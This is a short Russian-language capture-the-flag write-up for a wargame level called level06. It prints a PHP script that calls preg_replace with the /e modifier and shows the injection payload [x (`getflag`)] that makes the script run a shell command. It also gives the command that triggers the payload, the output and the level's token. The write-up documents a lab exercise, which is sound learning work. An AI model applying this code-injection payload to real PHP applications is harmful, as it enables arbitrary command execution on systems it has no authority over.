1. Домашняя папка содержит исполнительный файл level06 и PHP-файл level06.php

#!/usr/bin/php
<?php
	function y($m)
	{
		$m = preg_replace("/\./", " x ", $m);
		$m = preg_replace("/@/", " y", $m);
		return $m;
	}

	function x($y, $z)
	{
		$a = file_get_contents($y);
		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
		$a = preg_replace("/\[/", "(", $a);
		$a = preg_replace("/\]/", ")", $a);
		return $a;
	}

	$r = x($argv[1], $argv[2]);
	print $r;
?>

Код на вход берет имя файла, загружает из него содержимое, видоизменяет его и выводит в консоль.

2. После недолгого поиска в сети оказалось, что preg_replace в сочетании с модификатором /e имеет уязвимость: он может выполнить код на PHP, помещенный извне в виде текста.
https://medium.com/@isharaabeythissa/command-injection-preg-replace-php-function-exploit-fdf987f767df
https://www.php.net/manual/en/function.preg-replace.php
3. Создадим файл /tmp/php_exploit
4. В данный файл нужно подать содержимое, чтобы после модификации \[x (.*)\] оно преобразовалось в исполняемую команду getflag. Содержимым будет
[x (`getflag`)]
5. Выполняем:
-> ./level06 /tmp/php_exploit
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
6. Получаем токен для перехода на level07: wiok45aaoguiboiki2tuin6ub
